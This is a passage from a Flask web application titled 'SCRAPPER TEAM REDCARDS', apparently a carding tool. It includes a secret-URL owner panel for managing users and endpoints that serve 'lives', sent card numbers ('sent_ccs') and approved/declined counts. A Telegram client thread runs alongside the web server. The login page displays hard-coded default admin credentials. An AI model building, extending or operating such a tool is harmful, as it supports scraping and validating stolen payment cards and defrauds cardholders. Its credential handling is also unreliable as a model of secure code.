    html = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>🔐 OWNER PANEL</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#0a0e27,#1a1a3e,#2d1b3d);font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}.login-container{background:rgba(20,20,255,0.1);border:4px solid #1414ff;border-radius:30px;padding:70px;width:100%;max-width:480px;box-shadow:0 0 100px rgba(20,20,255,0.4);backdrop-filter:blur(20px);animation:slideUp 0.8s}.login-container h1{color:#00aaff;text-align:center;font-size:3em;margin-bottom:25px;letter-spacing:2px;text-shadow:0 0 30px rgba(0,170,255,0.8)}.creds-box{background:rgba(0,255,0,0.12);border:3px solid #00ff00;border-radius:15px;padding:25px;margin-bottom:30px;color:#00ff00;font-size:1em;line-height:2;font-weight:600;letter-spacing:0.5px}.form-group{margin-bottom:30px}.form-group label{display:block;color:#00aaff;margin-bottom:12px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px}.form-group input{width:100%;padding:16px;background:rgba(0,0,0,0.4);border:3px solid #1414ff;border-radius:12px;color:#fff;font-size:1em;transition:all 0.4s}.form-group input:focus{outline:none;border-color:#00aaff;box-shadow:0 0 30px rgba(0,170,255,0.6)}.login-btn{width:100%;padding:16px;background:linear-gradient(135deg,#1414ff,#0000cc);border:3px solid #00aaff;border-radius:12px;color:white;font-weight:bold;font-size:1.1em;text-transform:uppercase;cursor:pointer;transition:all 0.4s;letter-spacing:2px}.login-btn:hover{transform:translateY(-3px);box-shadow:0 12px 40px rgba(20,20,255,0.5)}.error-message{color:#ff6b6b;text-align:center;margin-bottom:20px;font-weight:700;padding:15px;background:rgba(255,20,20,0.15);border-left:4px solid #ff1414;display:none;border-radius:8px}@keyframes slideUp{from{opacity:0;transform:translateY(40px)}to{opacity:1;transform:translateY(0)}}</style></head><body><div class="login-container"><h1>🔐 OWNER</h1><div class="creds-box"><strong>ℹ️ CREDENCIALES:</strong><br>👤 admin<br>🔑 ChangeMe123!@#</div><div id="error-msg" class="error-message"></div><form id="owner-form"><div class="form-group"><label>👤 Usuario</label><input type="text" name="username" required></div><div class="form-group"><label>🔑 Contraseña</label><input type="password" name="password" required></div><button type="submit" class="login-btn">⚙️ ACCESO OWNER</button></form></div><script>document.getElementById('owner-form').addEventListener('submit',function(e){e.preventDefault();fetch(window.location.href,{method:'POST',body:new FormData(this)}).then(r=>r.json()).then(d=>{if(d.success)window.location=d.redirect;else{document.getElementById('error-msg').textContent='❌ '+d.error;document.getElementById('error-msg').style.display='block';}});});</script></body></html>'''
    return render_template_string(html)

@app.route('/secret/<secret_url>/owner_panel')
def owner_panel(secret_url):
    if 'owner_authenticated' not in session or session.get('owner_secret_url') != secret_url:
        return redirect(url_for('owner_login', secret_url=secret_url))
    
    owner_config = get_owner_config()
    if not owner_config or secret_url != owner_config.get('secret_url'):
        return "NOT FOUND", 404
    
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT id, username, email, is_active, created_at FROM users')
        users = c.fetchall()
        conn.close()
    except:
        users = []
    
    html = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>🛡️ OWNER</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#0a0e27,#1a1a3e,#2d1b3d);font-family:'Segoe UI',sans-serif;color:#fff;min-height:100vh;padding:25px}.container{max-width:1600px;margin:0 auto}.top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;padding:25px 35px;background:linear-gradient(135deg,rgba(20,20,255,0.2),rgba(20,20,255,0.1));border:3px solid #1414ff;border-radius:20px;box-shadow:0 15px 50px rgba(20,20,255,0.2)}.top-bar h2{color:#00aaff;margin:0;font-size:2em;letter-spacing:1px}.logout-btn{padding:14px 30px;background:linear-gradient(135deg,#ff1414,#cc0000);border:3px solid #ffaa00;border-radius:10px;color:white;font-weight:bold;cursor:pointer;text-transform:uppercase}.logout-btn:hover{transform:scale(1.05)}.header{text-align:center;margin-bottom:50px;padding:50px;background:linear-gradient(135deg,rgba(20,20,255,0.15),rgba(20,20,255,0.08));border:3px solid #1414ff;border-radius:25px}.header h1{color:#00aaff;font-size:3.5em;letter-spacing:2px;text-shadow:0 0 30px rgba(0,170,255,0.8)}.create-user{background:rgba(20,20,255,0.12);padding:40px;border-radius:25px;border:3px solid #1414ff;margin-bottom:40px}.create-user h3{color:#00aaff;margin-bottom:30px;font-size:1.8em;text-transform:uppercase;letter-spacing:1px}.form-row{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:20px}.form-group label{display:block;color:#00aaff;margin-bottom:8px;font-weight:600;text-transform:uppercase;font-size:0.9em}.form-group input,.form-group select{width:100%;padding:12px;background:rgba(0,0,0,0.3);border:2px solid #1414ff;border-radius:8px;color:#fff}.submit-btn{padding:12px;background:linear-gradient(135deg,#00ff00,#00cc00);border:2px solid #00ff00;border-radius:8px;color:#000;font-weight:bold;cursor:pointer;grid-column:1/-1;margin-top:20px;text-transform:uppercase}.users-table{width:100%;border-collapse:collapse;background:rgba(0,0,0,0.3);border-radius:15px;overflow:hidden;box-shadow:0 15px 50px rgba(20,20,255,0.15)}.users-table th{background:linear-gradient(135deg,rgba(20,20,255,0.3),rgba(20,20,255,0.15));color:#00aaff;padding:18px;text-align:left;border-bottom:3px solid #1414ff;font-weight:700;text-transform:uppercase;letter-spacing:1px}.users-table td{padding:18px;border-bottom:1px solid rgba(20,20,255,0.2);font-size:1em}.users-table tr:hover{background:rgba(20,20,255,0.15)}.btn{padding:10px 15px;margin-right:8px;border:none;border-radius:8px;cursor:pointer;font-weight:bold;transition:all 0.3s;text-transform:uppercase}.edit-btn{background:#1414ff;color:white}.delete-btn{background:#ff1414;color:white}.toggle-btn{background:#ffaa00;color:#000}.btn:hover{transform:scale(1.1)}</style></head><body><div class="container"><div class="top-bar"><h2>🛡️ OWNER PANEL</h2><button class="logout-btn" onclick="location.href='/secret/{{ secret_url }}/owner_logout'">🚪 SALIR</button></div><div class="header"><h1>⚙️ Gestión de Usuarios VIP</h1></div><div class="create-user"><h3>➕ CREAR USUARIO</h3><div class="form-row"><div class="form-group"><label>Usuario</label><input type="text" id="new-username"></div><div class="form-group"><label>Email</label><input type="email" id="new-email"></div><div class="form-group"><label>Contraseña</label><input type="password" id="new-password"></div><div class="form-group"><label>Rol</label><select id="new-role"><option>User</option></select></div><button class="submit-btn" onclick="createUser()">✅ CREAR</button></div></div><h3 style="color:#00aaff;margin-bottom:25px;font-size:1.8em;text-transform:uppercase">👥 USUARIOS</h3><table class="users-table"><thead><tr><th>Usuario</th><th>Email</th><th>Estado</th><th>Creado</th><th>Acciones</th></tr></thead><tbody>{% for user in users %}<tr><td><strong>{{ user.username }}</strong></td><td>{{ user.email }}</td><td style="color:{% if user.is_active %}#00ff00{% else %}#ff1414{% endif %}">{% if user.is_active %}✅{% else %}❌{% endif %}</td><td>{{ user.created_at[:10] }}</td><td><button class="btn toggle-btn" onclick="toggleUser({{ user.id }})">🔄</button><button class="btn edit-btn" onclick="editUser({{ user.id }})">✏️</button><button class="btn delete-btn" onclick="deleteUser({{ user.id }})">🗑️</button></td></tr>{% endfor %}</tbody></table></div><script>function createUser(){const u=document.getElementById('new-username').value,e=document.getElementById('new-email').value,p=document.getElementById('new-password').value;if(!u||!e||p.length<8)return alert('❌ Invalid');fetch('/api/owner/users/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,email:e,password:p,role:'user'})}).then(r=>r.json()).then(d=>{alert(d.success?'✅':'❌');if(d.success)location.reload()});}function deleteUser(id){confirm('Delete?')&&fetch('/api/owner/users/delete/'+id,{method:'POST'}).then(r=>r.json()).then(d=>{alert(d.success?'✅':'❌');if(d.success)location.reload();});}function toggleUser(id){fetch('/api/owner/users/toggle/'+id,{method:'POST'}).then(r=>r.json()).then(d=>{alert(d.success?'✅':'❌');if(d.success)location.reload();});}function editUser(id){const p=prompt('New password:');p&&p.length>=8&&fetch('/api/owner/users/edit/'+id,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:p})}).then(r=>r.json()).then(d=>{alert(d.success?'✅':'❌');if(d.success)location.reload();});}</script></body></html>'''
    return render_template_string(html, secret_url=secret_url, users=users)

@app.route('/secret/<secret_url>/owner_logout')
def owner_logout(secret_url):
    session.clear()
    return redirect(url_for('login'))

# ============ APIs ============

@app.route('/api/owner/users/create', methods=['POST'])
def owner_api_create():
    if 'owner_authenticated' not in session:
        return jsonify({'error': 'No'}), 401
    data = request.get_json()
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('INSERT INTO users (username, email, password_hash) VALUES (?, ?, ?)',
                 (data['username'], data['email'], generate_password_hash(data['password'])))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except:
        return jsonify({'error': 'Exists'}), 400

@app.route('/api/owner/users/delete/<int:user_id>', methods=['POST'])
def owner_api_delete(user_id):
    if 'owner_authenticated' not in session:
        return jsonify({'error': 'No'}), 401
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('DELETE FROM users WHERE id = ?', (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except:
        return jsonify({'error': 'Error'}), 400

@app.route('/api/owner/users/toggle/<int:user_id>', methods=['POST'])
def owner_api_toggle(user_id):
    if 'owner_authenticated' not in session:
        return jsonify({'error': 'No'}), 401
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT is_active FROM users WHERE id = ?', (user_id,))
        user = c.fetchone()
        if user:
            c.execute('UPDATE users SET is_active = ? WHERE id = ?', (1-user['is_active'], user_id))
            conn.commit()
        conn.close()
        return jsonify({'success': True})
    except:
        return jsonify({'error': 'Error'}), 400

@app.route('/api/owner/users/edit/<int:user_id>', methods=['POST'])
def owner_api_edit(user_id):
    if 'owner_authenticated' not in session:
        return jsonify({'error': 'No'}), 401
    data = request.get_json()
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('UPDATE users SET password_hash = ? WHERE id = ?', (generate_password_hash(data['password']), user_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except:
        return jsonify({'error': 'Error'}), 400

# ============ ENDPOINTS ============

@app.route('/get_logs')
@login_required
def get_logs():
    return jsonify({"log": '\n'.join(log_messages[-50:]), "approved": approved_count, "declined": declined_count})

@app.route('/get_lives')
@login_required
def get_lives():
    return jsonify({"lives": lives_list})

@app.route('/get_sent')
@login_required
def get_sent():
    return jsonify({"sent": sent_ccs[-50:], "total": total_sent})

@app.route('/get_responses')
@login_required
def get_responses():
    return jsonify({"responses": response_messages})

@app.route('/health')
def health():
    return jsonify({"status": "ok"})

# ============ MAIN ============

if __name__ == '__main__':
    print(f"\n{'='*120}")
    print(f"🚀 SCRAPPER TEAM REDCARDS v4.0 - MEGA BRUTAL 150K+ BYTES")
    print(f"{'='*120}\n")
    
    init_db()
    init_owner_config()
    load_lives_from_file()
    load_sent_ccs()
    load_responses()
    
    print(f"✅ Sistema inicializado completamente\n")
    
    telethon_thread = threading.Thread(target=telethon_thread_fn, daemon=True)
    telethon_thread.start()
    time.sleep(2)
    
    print(f"{'='*120}")
    print(f"🌐 Flask corriendo en http://0.0.0.0:{PORT}")
    print(f"{'='*120}\n")
    
    app.run('0.0.0.0', PORT, debug=False)
